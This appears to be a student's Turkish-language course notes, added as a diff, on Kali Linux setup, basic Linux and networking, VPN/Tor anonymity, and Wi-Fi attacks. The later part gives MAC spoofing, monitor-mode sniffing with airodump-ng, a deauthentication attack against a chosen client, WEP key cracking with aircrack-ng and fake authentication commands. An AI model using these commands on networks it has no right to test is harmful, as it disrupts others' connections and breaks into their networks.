@@ -1,0 +1,1928 @@
+eğer bilgisayar 64 bit olup virtualbox da kali linux ayarlarında 64 gözükmüyorsa BIOS dan virtualization technology i enable etmemiz gerekiyor 
+virtual box da kali linuz sistem ayarları işlemci bölümünde pae/nx in seçili olması gerekiyor 
+sanal makineyi başlatırken bazı hatalar alırsak headless start veya gözetimsiz başlat seçeneği ile başlatabiliriz
+Bilgisayarınızın 64 bit mi 32 bit mi olduğunu öğrenemediyseniz Bilgisayarım ikonu üzerine sağ tıklayıp özellikler kısmından bakabilirsiniz.
+virtual box daki ağ ayarlarında NAT değil NAT Network ü seçmemiz lazım 
+root = en yetkili kullanıcı
+virtual box ı kurduktan sonra ağlar seçeneklerinden NAT netwok ü seçmemiz gerekiyor
+virtual box ı yükledikten sonra usb gibi bağlantıları sorunsuz bir şekilde kullanabilmek için extension pack i kurmamız gerekiyor 
+"sudo su" komutu root yani en yetkili kullanıcıya geçişi sağlayan komuttur. bunu yazdıktan sonra mevcut kullanıcımızın şifresini girmemiz istenir
+ şifreyi girerken de güvenlik amacı ile şifremiz gözükmez
+sudo = Super-User DO (üst (düzey) kullanıcı yap! anlamındadır)
+snapshot = sanal makinanın işletim sistemini imajını yedekleme
+terminalde dosya --> yeni sekme seçeneğini seçersek başka bir terminal sekmesi daha açılır
+"setxkbmap tr" komutu klavye dilini türkçe yapar yani türkçe harfleri kullanabiliriz
+kalide windows tuşuna basıp keyboard yazıp oradan layout bölümünden turkish düzeni ekleyebiliriz 
+terminale env |grep LANG yazarsak sistem dilinin ne olduğunu görüntüleyebiliriz 
+dpkg-reconfigure kali-grant-root komutu sudo su yaptığımız zaman mevcut kullanıcımızın şifresini sormadan root a otomatik geçiş yapmamızı sağlar 
+bunu yazdıktan sonra en üstteki enable-password-less privilege escalation yani parolasız yetki yükseltmeyi etkinleştir seçeneğini seçiyoruz 
+ok tuşları ile bu seçeneği seçip enter a basıyoruz
+bunun etkin olması için de restart yapmamız gerekiyor 
+setxk yazdıktan sonra "tab" tuşuna basarsak hepsini yazmaya gerek kalmadan linux bunu bizim için tamamlar 
+"pwd" güncel olarak linux da hangi klasörün içinde olduğumuzu gösterir / dosya sistemindeki güncel konumumuzu mevcut konumumuzu gösterir
+"pwd" (print working directory) = çalışılan dizini yazdır demek 
+"ls" mevcut konumumuzdaki klasörleri listelemek için kullanılan bir komuttur "list" = yani listele anlamına gelir
+cd (change directory) = dizini değiştir dizin/klasör aynı şeylerdir cd, Unix benzeri ve Linux işletim sistemlerinde
+ o an içinde bulunulan dizini değiştirmeye yarayan komuttur.
+terminalde komut yazarken büyük küçük harf duyarlılığı vardır 
+"mkdir" (Make-Directory [dizin oluştur,klasör oluştur]) bir klasör/dizin oluşturmamızı sağlar 
+"cd .. veya sadece ".." yapıldığı zaman mevcut dizinden bir önceki dizine dönülmüş/geçilmiş olunur"
+"clear" komutu terminaldeki bütün yazıları siler ve terminali ilk açıldığı konumuna döndürür (mevcut dizinini koruyarak)
+apt-get update (kütüphaneleri,depoları günceller güncel sürümlerini getirir
+apt-get upgrade (güncellenen, güncel versiyonları getirilen uygulamaların, "güncelleme işlemini indirilme ve kurma işlemini gerçekleştirir")
+bir program veya araç yüklenirken terminalde Y/n ya da eğer türkçe ise E/h çıkarsa E veya Y yi seçmemiz lazım Evet hayır, Yes,no 
+terminalde bir önceki yazılan komutu elle yazmak yerine otomatik olarak getirmek için "yukarı ok" tuşuna basmamız yeterlidir
+ ne kadar basarsak sırayla ilk yazdığımız komuta kadar görüntülenir 
+apt-get install bir programı yüklemek için kullanılan komuttur 
+adduser sisteme yeni bir kullanıcı ekler 
+passwd şifre değiştirme komutudur 
+psswd yazarak şifre değiştirirken yeni şifremiz içinde türkçe karakter olmaması daha sağlıklı çünkü tekrar başlatınca
+ otomatik eng klavyeye dönerse problem yaşayabiliriz 
+router = modem
+Local IP, yerel IP'dir. Yerel IP, bilgisayarınızın modemden aldığı IP'ye denir. = aynı ağda olmayan bir cihaz tarafından görüntülenemez 
+public (genel ip) İnternette kullanılan genel global adreslerdir. Genel bir IP adresi, İnternet'e erişmek için kullanılan bir IP adresidir.
+ Genel (genel) IP adresleri, özel adreslerden farklı olarak Internete  yönlendirilir. 
+modemin tek bir ip adresi vardır bu da public ip dir 
+modeme bağlanan bütün cihazların public ip si aynıdır (modemin ip adresidir)
+local ip modem tarafından atanır
+modemin local ip adresi genelde ".1" ile biter ilk/birinci cihaz modemdir anlamında "255" taneye kadar atanabilir 
+mesela telefonumuzla google.com a gitmek istediğimizde öncelikle modemimize bir request yani istek oluştururuz modemimiz bu istedi alır
+ internete bu isteği yollar internet modemimize bir response yani cevap yollar modemimiz aldığı bu cevabı bize response olarak tekrar gönderir
+  böylece siteye ulaşmış oluruz 
+ifconfig diyerek bağlandığımız ağdaki ip adresimize ulaşabiliriz bu komutu yazdıktan sonra çıkan "inet" satırı bizim local ip mizdir 
+virtual box içinde oluşturduğumuz NAT Network ağlarının local ip si genelde "10." ile başlar
+windows da da ipconfig yazarak local ipmizi görebiliriz
+windows un terminali komut istemcisi yani cmd dir
+bunu da sol alttaki windows simgesinden cmd yazarak ulaşabiliriz 
+mac bilgisayarlarda da ifconfig yazabiliriz 
+Virtual Private Network (sanal özel ağ) VPN
+konum tespiti public ip üzerinden yapılır 
+DNS Domain Name Server 
+domain = Alan adı, bir Web sitesinin İnternet'teki adı ve adresidir.Domain ya da alan adı, bir web sitesinin fiziksel adıdır.
+dns = internetteki telefon rehberidir Kolay hatırlanan isimleri (Hosting.com.tr) IP adreslerine çevirir (77.245.157.253) domain yani
+alan adlarını ip ye çevirir çözümler böylece bir domain yazdığımızda o siteye bağlanabiliriz 
+DNS, verilen bir makina adının IP adresini çözerek makinaların internet üzerinde host isimleri ile haberleşmelerine olanak tanır.
+Siz bir siteye erişmek istediğinizde, DNS sayesinde hangi site nerede, hangi IP hangi bilgisayara ait olduğu belirlenir 
+ve istediğiniz yere erişirsiniz.
+Bir DNS istemci bir bilgisayarın ismine karşılık IP adresini bulmak istediği zaman isim sunucuya başvurur. İsim sunucu, yani DNS sunucu 
+da eğer kendi veri tabanında öyle bir isim varsa, bu isme karşılık gelen IP adresini istemciye gönderir. 
+DNS serverının veri tabanına kayıtların manuel girilmesi gerekir.
+ ping www.google.com yazarsak google a ping atmış oluruz
+ Ping programı, 1983 yılında Mike Muuss tarafından yazılmış bir programdır. Bir makineye genelde 32 baytlık bir ICMP pakedi gönderir 
+ ve aynı paketin geri gelmesini bekler. Bu basit program, birçok işe yarayabilir. 
+ Sunucu size ne kadar uzak ise, bu süre de o kadar artmaktadır. Kullandığınız bağlantı tipinin ping'e etkisi büyüktür. 
+ Ping süresi bağlantı kalitesini de etkiler.
+Ping süresi düştükçe bağlantı kalitesi artar.
+bir klasörün içindeyken bütün dosyaları seçmek için shift e basılı tutup en alttaki klasörü ve ardından en üsttekini seçersek aradaki bütün dosyaları seçmiş oluruz 
+bir dizinin içindeki .zip uzantılı dosyaları açmak için "unzip" komutu kullanılır 
+vpn book sitesinde dosyaların en altında vpn in kullanıcı adı ve şifresi vardır
+authentication failed hatası vpnbook un şifresini veya kullanıcı adını yanlış girmemizden dolayıdır 
+initialization sequence completed mesajı vpn book a düzgün bir şekilde bağlantı sağlandığını gösrerir 
+vpnbook daki bütün dosyaları denemeliyiz birisi çalışmazsa
+yine çalışmazsa dns i değiştirmeyi denememiz gerekiyor 
+veya mobil veriden hotspot internet paylaşımından bağlanıp deneyebiliriz 
+vpn book u çalıştırmak için arşivden çıkardığımız dosyaları "openvpn" komutundan sonra dosyanın ismi yazılacak şekilde komut satırına gireriz
+openvpn ile bağlantı gerçekleştikten sonra whatismyipaddress.com a girip değiştiğini doğrulayabiliriz
+firefox un arama çubuğuna about:config yazarak firefox un ayarlarına ulaşabiliriz burada media.peerconnection.enable satırının değerini
+ false yaparsak webrtc özelliğini kapatmış oluruz
+WebRTC projesi Google tarafından 2011 I/O sırasında duyuruldu ve herkese açıldı. WebRTC en temelde peer-to-peer olarak gerçek zamanlı 
+sesli ve görüntülü iletişimi ve data paylaşımını sağlamaktadır.
+bu özelliği kapattık çünkü ip mizi olduğundan farklı yerlerde ortaya çıkarabiliyor
+terminalden açmış olduğumuz openvpn dosyası çalıştığında crtl+c veya terminali kapatarak vpn i durdurabiliriz
+vpnbook da kaliyi her açtığımızda terminalde dosyayı çalıştırmamız gerekiyor vpn aktif olması için sistem otomatik başladığında çalışmıyor 
+ve çalışmaya ayarlanamıyor
+etc klasörünün içerisinde bazı ağ ile ilgili dosyalar mevcuttur 
+nano bir text editörü programıdır 
+bu etc klasörünün içerisindeki bir dosyayı değiştirmek nanoyla açmak için nano /etc/dhcp/dhclient.conf komutunu çalıştırıyoruz
+dosyayı açtıktan sonra ok tuşları ile aşağı inip prepend domain name server satırına gelip başındaki kare/hash işaretini kaldırıyoruz
+bunu yapmamızın sebebi # işareti olan satırlar işleme alınmaz yani yazılımda yorum satırı gibi düşünebiliriz 
+bu satırda dns server adreslerimiz yazar
+bu satırda tamamen boş değersiz bir alan görebiliriz veya 127.0.0.1 gibi bir değer görebiliriz
+burayı değiştirerek istediğimiz bir dns adresini yazabiliriz bir boşluk bırakarak yazmaya başlamalı ilk adres bittikten sonra bir virgül koyup
+ ardından bir boşluk ve ikinci adress yazılıp ctrl+o ile kaydedilip ctrl+x ile de nanodan çıkılır 
+ (terminal ekranına geri dönülür) (satırın en sonunda bir noktalı virgül bulunmalıdır)
+cat komutu herhangi bir dosyanın içeriğini okumamızı sağlar 
+bu yöntem 2020 sürümünden sonra işe yaramıyor olabilir 
+nanoyla da okuyabiliriz ama cat yazarsak dosyanın içeriğini direk olarak terminale yazdırır
+değişip değişmediğini doğrulamak için cat /etc/resolv.conf dosyayı açılır eğer değişmişse değiştirdiğimiz dns adresleri çıktı olarak verilir 
+değişmemişse büyük ihtimalle /etc/resolv.conf un içinde o an mevcut olarak kullandığımız dns sunucusunun adresleri vardır 
+192.168.1.1 /0.1 gibi bir adres bizi karşılar bu gibi bir durumda direk olarak /etc/resolv.conf dosyasını değiştirmemiz gerekebilir 
+bu dosyayı "leafpad" isimli bir text editörü ile değiştirmemiz gerekiyor genelde leafpad yüklü gelmez bu yüzden root kullanıcısında 
+(sudo su yazıp) root a geçip apt-get install leafpad yazarak 
+bu text editörünü yüklüyoruz 
+kalide openvpn i ctrl+c ile kapattığımızda eğer internetimiz giderse service network-manager restart komutu ile 
+ağ bağlantımızı yeniden başlatmak faydalı olabilir 
+bir siteye ping attıktan sonra da bu ping işlemini ctrl+c ile durdurabiliriz 
+leafpad windowsdan da alışık olduğumuz notdefterine çok benziyor terminale leafpad yazarak çalıştırabiliriz
+leafpad /etc/resolv.conf komutu ile açıp buradaki değeri silip 1.1.1.1, 1.0.0.1 yazıp kaydedip kapatıyoruz
+leafpad ile açarken hata alırsak chattr (change attribute) = niteliği değiştir komutunu kullanıyoruz / özelliklerini değiiştir 
+bunu yazarak resolv.conf u açılabilir hale getiriyoruz 
+chattr -a /etc/resolv.conf Yazma yetkisi hariç diğerlerini kilitler chattr -a komutu, bunun ysnı sıra da +a komutu da bu kiliti kaldırır 
+lsattr bir dosyanın özelliklerini/niteliklerini listeler 
+chattr -i /etc/resolv.conf dosyasını değiştirebilir hale getirme komutudur chattr -i dosyadı şeklinde kilidi kaldırabildiğiniz gibi
+ lsattr komutu ile kilitlenmiş dosyaları görüntüleyebilirsiniz.
+immutable = değişmez 
+mutable = değişebilir 
+bu işlemden sonra leafpad /etc/resolv.conf yazarak dosyayı açıp değiştirebiliriz 
+chattr +i /dosyakonumu  bir dosyayı immutable yani değiştirilemez bir veri eklenip veya silinemez bir duruma getirir 
+resolv.conf da dns değiştirmek isterken 2 den daha fazla dsn adresi girmek için şöyle bir biçim kullanabiliriz
+nameserver 8.8.8.8
+nameserver 8.8.4.4 gibi 
+Yazma yetkisi hariç diğerlerini kilitler chattr -a komutu +a da bunu kaldırır 
+nanoda açıp düzenledikten sonra ctrl+o diyip kaydedip enter a basıp ctrl+x ile çıkış yaparız 
+vpnbook da vpn in fatal error almasının sebebi dns den dolayıdır 
+dnsleaktest.com dan dns imizde sızıntı var mı kontrol edebiliriz 
+bu sayfadaki standart test e girip gerçekten bizi trace / izlemek takip etmek yapaibliyorlar mı kontrol edebiliriz 
+bu testte 6 ip ye sunucuya kadar gerçek dns adresimizin gözükmediğini ve anonim olduğumuzu görürüz 
+terminalde komutları yazarken sonuna eklenen -y komutu yüklemeler yapılırken veya güncellemeler vs bize yüklemek istediğimize emin misin 
+sorusunu almamak için başından yes diyerek kabul ettiğimiz anlamına gelir 
+ biz internetimizi ana makineden aldığımız için ana makinemizde bir vpn açarsak bu kalide de otomatikmen açılmış olur kali de o vpn e bağlanmış 
+ olur 
+tar.gz arşivlenmiş/paketlenmiş bir dosya türüdür bunu açmak için dosyaya sağ tıklayıp extract here diyebiliriz ya da arşiv yöneticisi ile açıp 
+sağ alttaki aç seçeneğiyle klasöre açabiliriz
+bazen user interface yani dosya yöneticisindeki dosya isimleri ile terminaldeki ismi aynı olmayabillir 
+bunun sebebi dosyaya 2 tane isim atanır birincisi başlık ikincisi yol yani dosya uzantısını içeren addır bunu sağ tık yapıp
+ özelliklerden görebiliriz 
+.desktop veya setup uygulamalarını çalıştırmak için ./dosyaadı komutu kullanılır 
+eğer tor broweserı root olarak çalıştırmak istiyorsak root ile çalıştırdığımız için bir hata alacağız bunu aşmak için arşivden çıkarmış 
+olduğumuz dosyanın içindeki /home/kurib0h/Downloads/tor-browser_en-US/Browser/start-tor-browser isimli dosyayı
+ herhangi bir metin editörü ile açıp 94-97 satırlar dahil ve arasındaki run as root ifadesini içeren if ile başlayıp fi ile biter bölümü silip 
+ kaydediyoruz komutları silip the tor browser bundle should not belirlenir
+vpn bir terminalde çalışmaya devam ederken eğer o terminali kapatırsak vpn hizmeti de sonlanır başka bir şey yapmak için
+ terminal bölümünden file>new tab e basarak yeni bir terminal açabiliriz 
+ tor .onion uzantılı sitelere ulaşmamıza olanak sağlar 
+ tor u linuxa yüklemek için apt-get install tor -y yazmamız gerekir 
+bazı ülkelerde tor ağları bloklu olduğu için indirme işlemini ve çalıştırma işlemini vpn ile yapmak daha garanti olacaktır
+ her zaman bir sorun çıkacak anlamına gelmiyor ama sorun çıkarsa vpn açıp tekrar deneyebiliriz eğer problem yaşarsak 
+ connect in yanındaki configure kısmından bağlandığım ülkede tor ağı engelli diyip bir köprü bağlantısı kullanarak bağlanmayı dneeyebiliriz 
+duckduck go ya hidden wiki yazarsak darkweb veya deep web in bir nevi ketegorize bir özetini elde etmiş oluruz site adresleri olarak 
+deep webden bir siteye girmeden arama çubuğunun en sonunda sağ tarafta bir kalkan simgesi var buradan güvenlik seviyemizi göebiliriz
+ buraya tıkladıktan sonra advenced  security settings e tıklayıp buradan safer dersek javascript i etkin olmaktan çıkartıyor güvenlik için 
+wifi kartımızı kaliye bağlarken öncelikle extension paketinin yüklü olduğundan emin oluruz daha sonra kalinin ağ ayarlarından 
+bağlantı şeklimizi bridge adapter köprü bağdaştırıcısı yaparız 
+ifconfig komutunu yazdığımızda aktif olarak kullandığımız ağ kartlarının "ether" satırındaki değer MAC adresimizdir 
+(txqueuelen kısmımna kadar olan değer)
+eğer biz bir bilgi alışverişi yapmak istiyorsak örneğin google.com a gitmek istiyoruz öncelikle google.com a bir request yollanır
+ modem aracılığıyla google.com da bu isteğe karşılık bir cevap yani response yollar modem de o cevabı bize iletir
+  böylece medya araçları arasında devamlı bir iletişim olur ve bu iletişim mac adresleri kulllanılarak yapılıyor 
+biz hedef mac adresine kendi orijinal mac adresimizden bir paket yolluyoruz yani aslında bu bilgiler havada uçuşurken 
+çıktıkları ve gittikleri mac adresleri belli oluyor o yüzden bütün bu bilgi alışverişi mac adresleri kullanılarak yapılıyor 
+IP adresini bir otomobilin plakası olarak düşünebilecekken, MAC adreslerini de bir şase numarası olarak düşünebilirsiniz.
+ IP adresi değiştirilebilirdir ve otomobilinizi gören herkes IP adresinizi görebilir. Oysa MAC adresi IP’nin aksine değiştirilemez bir
+  fiziksel adres numarasıdır. MAC adresleri genel değil sadece yerel haberleşme ağında kullanılır ve bu MAC’i özel kılar. MAC adresini
+  kullanarak aynı ağ üzerindeki aygıtların birbirini bulması ve Router gibi aygıtların cihazlarınızı karıştırmadan tanıması sağlanır.
+   Haliyle MAC adresiniz aynı ağı paylaştığınız kişi ve cihazlar haricinde görülemez. 
+   Bunun dışında yalnızca bazı istisnai durumlarda İnternet Servis Sağlayıcı’nız (ISP) güvenlik nedenlerinden dolayı MAC adresinizi
+    takip etme ihtiyacı duyabilir.
+mac adresleri normalde üretici firma tarafından belirlenir ve statik durağandır değiştirilemez ama bunu sistemsel/yazılımsal olarak
+değiştirmenin bir yolu var bunu yapmak için de öncelikle bağlı olduğumuz ağın ismini kullanarak ifconfig eth0 down diyoruz ve kapatıyoruz
+(eth0 burada kullanmış olduğumuz network interfaceidir)
+macchanger kullanacağız macchanger ın yardım komutlarını öğrenmek için macchanger --help yazabiliriz 
+macchanger --random wlan0 komutu ile macchanger aracılığı ile kullanmış olduğum eth0 ağ kartına rastgele bir mac adresi verebilirim 
+macchanger kullanmadan önce yukarıdaki komutla ifconfig eth0 down devredışı bırakıyoruz ki mac değiştirme işi başarılı olsun 
+random bi şekilde macadresimiz değiştirildi normalde üreticimiz parantez içerisinde görünüyordu ancak şuan unknown durumda 
+ifconfig wlan0 up yazarak tekrar ağı etkinleştiriyoruz
+tekrar ifconfig diyerek ether satırında yeni mac adresimizi görebiliriz 
+Managed Mod: Bir erişim noktasına bağlanarak hizmet alan istemcinin bulunduğu mod. 
+(havada uçuşan onca veri arasından sadece kendisine gönderilen veriyle ilgilenir)
+Monitor Mod: Herhangi bir kablosuz ağa bağlanmadan pasif olarak ilgili kanaldaki tüm trafiğin izlenmesine olanak sağlayan mod.
+ Kablosuz ağlarda güvenlik konusunda sık sık kullanılan bir moddur.
+terminalde monitör moda geçmek için airmon-ng start wlan0 [kullanılan ağ noktası neyse onun ismi]
+aktif ağ kart ve bağlantılarını görmek için de ifconfig komutunu çalıştırabiliriz 
+bu komutu çalıştırdıktan sonra ağ bağlantısında aktif olarak kullanılan bazı hizmetleri gösterebilir bunlar airmon a geçmeyi engelleyebilir
+ veya zorlaştırabilir eğer istersek airmon-ng check kill diyerek bu işlemlerin hepsini sonlandırabiliriz
+  (!!eğer hiç bir şey çalışmaz ise bunu yapabiliriz!!)
+monitör moda geçtiğimizi doğrulamak için ekrana çıktısı verilen sondan ikinci satırda 0mon) başlığı altında 
+ monitor mod vif enabled yazısını kontrol edebiliriz veya ifconfig yazarak kullandığımız ağ bağlantısının isminin
+  wlan0mon olarak değiştirildiğini görebiliriz 
+oradaki mon -> monitor'un mon u 
+eğer terminalde iwconfig wlan0mon yaparsak (ifconfig in wlan kablosuz bağlantılar için bilgilendirici komutu) yazdırılan çıktının ilk satırında 
+Mode un :Monitor olduğunu görebiliriz (kapattıktan sonra mode:managed olarak gözükür)
+spesifik olarak bir ağ kartını belirtmek için sonuna ismini de yazabiliriz istersek direkt olarak iwconfig de yapabiliriz 
+eğer monitor moddan çıkmak istiyorsak airmon-ng stop wlan0mon yazabiliriz böylece managed moda geri dönecektir 
+monitor moda geçmek için kullanabileceğimiz ikinci yöntem ise ifconfig wlan0 down diyerek kablosuz bağlantımızı etkisiz hale getiriyoruz
+ daha sonra iwconfig wlan0 mode monitor yazıp monitor moda geçebiliriz son olarak ifconfig wlan0 up yaparak kablosuz bağlantımızı etkin hale getiriyoruz 
+bu komutun çalışıp çalışmadığını da iwconfig wlan0 komutunu yazıp yazdırıkan çıktıdaki mode bölümünden kontrol edebiliriz diğerinden farkı
+ orada bir framework kullanıyoruz ve ağ bağlantımızın adını değiştiriyor bu komutta ise değiştirmiyor
+ (ne iwconfig de ne de ifconfig de değiştirmez adımızı) bu komutta monitor moddan çıkmak için yapmış olduğumuz işlemlerin tam tersini yaparız 
+Yani ; 
+iwconfig wlan0 down 
+iwconfig wlan0 mode managed 
+iwconfig wlan0 up 
+iwconfig wlan0 --------------> diyerek mode u kontrol edebiliriz 
+ağdaki trafiğin gözlemlenmesi eylemine hacking terminolojisinde sniffing (koklama) denir 
+networklere giren çıkan bilgi miktarını ve nasıl ayarlandığını bize gösteren framework ün adı airodump
+airdump ın parametresi şudur ; airmon-ng start <interface(arayüz)> (monitor mode) airodump-ng <interface> / control + c 
+monitör modda iken airodump-ng wlan0mon (interface) diyerek etraftaki verileri veri akışı ve modemleri anlık olarak görüntüleyebiliriz 
+dinamik bir framework olduğu için durdurulmadığı sürece aktif olarak kalacaktır durdurmak için ctrl+c tuşuna basabiliriz 
+yazdırılan output da bssid denilen kısımdaki değerler adsl modemlerin/router ların mac adresidir
+airodump-ng ile izlediğimiz trafikteki STATION bölümündeki değerler aynı ağa bağlı olan cihazların mac adresleridir 
+#data kısmı bizim o cihaz hakkında öğrenebileceğimiz bilgiler veriler elimizde olan datalar 
+BSSID (Basic Service Set Identifier - Temel Hizmet Takımı Tanımlayıcısı): Her kablosuz aygıt için benzersiz bir tanımlayıcı. 
+BSSID, aygıtın Ethernet MAC adresidir. bssid yi sürekli kullanacağız bu yüzden elimizin altında olması önemli 
+bu tabloda ki pwr denilen bölüm veri alınan bağlantının uzaklığı 0 a yakınlaştıkça mesafe azalır kullandığımız cihaza olan mesafesi 
+ENC bölümü encryption yani hangi şifreleme stndartı ile şifrelendiğinin belirtildiği bölümdür 
+cipher bölümü şifrenin hangi standart ile decryption yani şifresinin çözüldüğünün belirtilidği bölüm 
+essid de modemin router ın ismidir networkün ağı 
+AİRODUMP-NG parametreleri şu şekildedir ; airodump-ng-channel<channel>-bssid<bssid>-write<file_name> <interface>
+airodump-ng -channel 12 -bssid 40:30:20:10 -write test mon0
+CH Channel yani kanal veri alma veri verme işini belli kanallar üzerinden yaparız 
+burada da görüntülenen cihazın wireless bağlantısını hangi kanal üzerinden yaptığı belirtilir 
+ENC sutunundaki bilgiler o ağın hangi şifreleme algoritması ile şifrelendiğini gösterir 
+aynı ağa aynı channel üzerinden bağlanılırsa internette yoğunluk olabilir bağlantı yavaşlayabilir
+ bu yüzden farklı bir channel seçmek faydamıza olacaktır 
+airodump-ng --channel 9 --bssid 20:F3:A3:B6:32:3C --write test1 wlan0mon (en son bütün bu işlemlerimizi test1 isimli bir dosyaya yazdıracak)
+bu komutu yazdıktan sonra yeni bir işlem açılacak bu işlemde tek bir bssid ye odaklanarak işlem yapmaya başladı frameworkümüz 
+açılan yeni işlemde ilk bssid bilgilerini içeren kısım hedef aldığımız ağımıız ve modemimizin bilgileridir 
+alttaki 2.ci bssid bölümündeki bilgiler ise hedef aldığımız ağa bağlı olan client yani istemcilerin cihazların aletlerin listesidir 
+tektek bu networke bu ağa kimler bağlanmış ve bunların mac adresleri nedir bunu görebiliriz
+bu bölümdeki station sütunu, bağlı olan cihazların mac adresleridir bu değerler onların mac adresleridir 
+ctrl c yaptığımızda terminalde gördüğümüzden çok daha detaylı bir raporu test1 isimli bir dosyaya yazdırdı bizim için framework 
+ls test1* sonuna yıldız koyduğumuz zaman cihazımızdaki bu isimde bulunan bütün dosyaları listeler 
+bu detaylı dosyanın ismi test1-01.cap dir 
+wireshark (komutu) ile bu cap uzantılı dosyayı açıp giden gelen bütün verileri şifrelenmiş bir şekilde görebiliriz
+ağa bağlı olmadığımız için böyle şifreli gözüküyor ama bağlansaydık ne yaptığını açık bir şekilde görebilirdik 
+
+bu dersimizde deauthentication attack dediğimiz kullanıcıyı networkden kopartma saldırısı yapacağız authentication(kimlik doğrulama)
+ bir yere giriş iznimizin olması demek ağa giriş izni olmasına yani network şifresini bilip bağlanmasına rağmen biz istediğimiz kullanıcıları
+  ağdan düşürecek güce sahibiz bunu da aireplay dediğimiz bir framework kullanarak yapacağız 
+aireplay i kullanmadan önce airodump-ng --channel 9 --bssid 20:F3:A3:B6:32:3C --write test1 wlan0mon komutunu çalıştırıp 
+kendi ağınızı tarıyoruz istersek sondaki --write test1 ifadesini silerek rapor dosyasını oluşturmayabiliriz
+bunu yaptıktan sonra önce kendimize bir hedef seçiyoruz ağımızdaki bir kullanıcıyı 
+frame bölümündeki değeri yüksek olan kişi ağda aktif bir şekilde veri alışverişi yapan bir kullanıcıdır 
+aireplay-ng --deauth 10000 (buraya hedefe kaç adet paket göndereceğimizi girdiğimiz bölüm eğer kısa bir süre içinde kopsun istiyorsak 
+5-10 gibi bir sayı girebiliriz ya da uzun süre boyunca giremesin istiyorsak da daha büyük sayılar 10000 gibi girebiliriz 
+ve böylece bir daha ağa asla bağlanamaz) -a (burası saldıracağımız modemin bssidsi) 20:F3:A3:B6:32:3C -C (saldıracağımız kullanıcının 
+mac adresini yazıyoruz)
+2C:F0:EE:1A:BE:96 wlan0mon airdump monitör modda iken mmac adresleri STATION sutunun altındaki değerlerdir 
+deauthentication attack da aireplay-ng framework ü kullanılır 
+aireplay-ng --deauth<#packets>-a<AP> <İNTERFACE> 
+-a dan sonra saldıracağımız adsl modemin ağın/router ın bssid sini yazmamız gerekiyor 
+-c den sonra hedef seçtiğimiz saldıracağıımız CİHAZIN bssid sini yani mac adresini yazmamız gerekiyor 
+saldırıyı başlattıktan sonra monitor modda saldırdığımız cihazın Lost bölümünde birden normalden daha fazla bir paket artışı olduğunu gözlemleriz 
+bu saldırımızın başarılı bir şekilde gerçekleştirğinin göstergesidir ex:aireplay-ng --deauth 1000-a 10:20:30:40 mon0 
+aireplay-ng --deauth <#packets> -a <AP> -< <TARGET> <interface> ex: aireplay-ng --deauth 1000 -a 10:20:30:40 -c 00:AA:11:BB mon0 
+<AP> access point dir 
+
+WEP dediğimiz şifreleme modeli eski bir şifreleme modelidir modası geçmiştir
+wep de modemde şifrelenen bilgiler client a gidince yani bağlı olan cihaza gidince deşifre ediliyor ve bu aradaki şifreleme texti
+ küçük bir metinle bir yerden bir yere taşınıyor yalnız bu metindeki problem
+bu geçici bir metin değil kısa bir metin bir çok pakette farklı olsa da belli bir yerden sonra aynı metinler haline geliyor 
+IV dediğimiz paketler içerisindeki verileri yakalayarak bu metni ortaya çıkartıp şifreyi kırabiliyoruz yani kısacası burada
+ devamlı değişen ve dinamik olan bir şifreleme yok biraz daha eski bir şifreleme kullanılıyor 
+ve kolay kırılabilir bir yöntemle karşı karşıyayız 
+WPA de geçiçi şifre text stringleri gönderdiği için onda bu yöntemi kullanamıyoruz
+wep cracking için airodump ı kullanacağız 
+airodump sadece bilgi toplamak için değil 
+her türlü ağlarla çalışırken kullandığımız bir frameworkdür 
+bazen usp wifi adaptör bilgisayara bağlıyken çıkarmadan sanal makineyi kapatıp açmak bazı ağ problemlerine sebep oluyor
+ bu yüzden kapatmadan önce adaptörü çıkartıp sonra açıldığı zaman takıp kullanmaya devam etmek daha iyi bir seçim 
+wep cracking için öncelikle airmon-ng start wlan0mon diyoruz 
+iwconfig yazarak wlan ın durumunu ve modunu kontrol ediyoruz 
+airdump-ng wlan0mon yazıp etrafımızdaki trafiği izlemeye başlıyoruz 
+ctrl+c ye basıp işlemi durdurduk 
+WEP CRACKING airodump parametreleri 
+airodump-ng --channel <channel> --bssid <bssid> -write <file_name> <interface>
+ex: airodump-ng -channel 10 -bssid 10:20:30:40 -write test mon0
+aircrack-ng <file_name>
+aircrack-ng test-01.cap 
+airodump da bir ağın trafiğini izlerken o ağdaki #Data bölümündeki değerler yüksek ise o ağdaki clientlardan biri veya hepsi 
+aktif bir şekilde interneti kullanıp veri alış verişi yapıyor demektir
+ardından kendimize hedef olarak bir ağ seçip airodump-ng --bssid 20:F3:A3:B6:32:3C --channel 9 --write webcrack wlan0mon yazıp
+ bu ağdaki bilgileri izleyip gelen giden verileri alıp bir dosyaya kaydediyoruz 
+bu dosyayı açmak için terminalde file diyip new terminal e basıp yeni bir terminal açıp düzgün bir yere konumlandırıyoruz 
+yeni açtığımız terminalde aircrack-ng webcrack-01-cap dosya dizininden computer/root un içinde dosyamız 
+bunu yazdıktan sonra entera basıyorum aircrack bizim wep şifrelemesini kullanan bu ağdaki verileri alıp inceleyip bunları kırmaya çalışacak 
+bunu yaptıktsn sonraa işlem otomatik olarak devam eder aircrack belirli bir sayıda IV yani gelengiden verileri toplayıp 
+bunlardan şifreyi analiz edip bulmaya çalışır
+10.000 IV ye kadar başarısız olabilir o yüzden bulana kadar beklemeliyiz 
+bulduğu zaman KEY FOUND! [A1:B2:C3:D4:E5]
+DECRYPTED CORRECTLY 100% ŞEKLİNDE BİR ÇIKTI VERİR BU DEĞER O AĞIN ŞİFRESİDİR 
+yazdırılan değerdeki iki nokta üste kısımlarını silmemiz gerekyor yani aslında şifre A1B2C3D4E5 tir 
+
+BU DERSİMİZDE SAHTE YETKİLENDİRMEYİ yani Fake Authentication u öğreneceğiz
+bunu airepla-ng framework ü ile yapacağız 
+parametrelerimiz aireplay-ng -fakeauth 0(buradaki değer kaç adet paket yollayacağımız ile ilgili 0 yazmamız yeterli 
+saldırı amacımıza göre yazabiliriz yüksek sayıda paket de yollayabiliriz küçük sayıda paket ile de)
+ (fakeauthentication yapabiliriz kendimizi) -a <target_MAC> -H <kali_MAC/kendi mac adresimiz> <İNTERFACE/ağkartımızınismi örn wlan0>
+ex (example=örnek) aireplay-ng -fakeauth 0 -a 10:20:30:+0 -h 50:AA:BB:40  mon0
+bir önceki örnekteki ağdaki veri akışı fazla olduğu için biz bu verileri kullanarak web şifresini kırdık ama
+ bu sefer eğer o kadar fazla veri akışı yoksa biz oraya bir packet injection 
+yani veri enjeksiyonu yapabiliriz böylece kendimizi fake sahte bir şekilde yetkilendirme yapabiliriz 
